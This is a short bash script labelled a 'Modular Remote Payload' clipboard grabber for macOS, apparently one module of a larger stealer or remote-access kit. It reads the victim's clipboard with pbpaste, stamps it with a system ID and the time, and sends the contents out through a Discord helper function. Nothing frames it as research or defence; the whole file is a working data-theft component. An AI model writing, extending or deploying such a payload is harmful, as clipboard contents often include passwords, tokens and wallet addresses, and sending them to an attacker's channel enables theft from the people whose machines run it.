#!/bin/bash
# ============================================================
# Clipboard Grabber for macOS - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)
OUTPUT="📋 **Clipboard from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n"

CLIP=$(pbpaste 2>/dev/null)

if [[ -n "$CLIP" ]]; then
    # Truncate if too long
    if [[ ${#CLIP} -gt 1800 ]]; then
        CLIP="${CLIP:0:1800}... (truncated)"
    fi
    OUTPUT+="\`\`\`$CLIP\`\`\`"
else
    OUTPUT+="⚠️ Clipboard is empty"
fi

send_discord "$OUTPUT"

